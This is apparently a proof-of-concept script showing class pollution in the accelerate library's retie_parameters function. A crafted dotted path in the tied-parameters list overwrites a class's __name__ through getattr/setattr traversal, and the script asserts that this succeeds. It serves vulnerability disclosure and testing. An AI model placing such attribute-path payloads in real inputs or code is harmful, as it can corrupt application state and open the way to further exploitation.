# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: retie_parameters
# Type: get-attr-set-attr

from accelerate.utils.modeling import retie_parameters
import torch

class Target: pass
target = Target()

class MockModel:
  pass

model = MockModel()
model.target = target
# Create a non-meta tensor that will be used as the "tied" value
model.pwnd = torch.tensor([0.0])

payload_value = model.pwnd
# retie_parameters: for each tied group, finds first non-meta param, then
# setattr's all other paths to that same object
# Path traversal: splits on ".", getattr to parent, setattr leaf
PAYLOAD = [["pwnd", "target.__class__.__name__"]]

def run_poc():
  retie_parameters(model, PAYLOAD)

def verify_poc():
  original_name = target.__class__.__name__
  assert original_name == "Target", "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ != "Target", "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
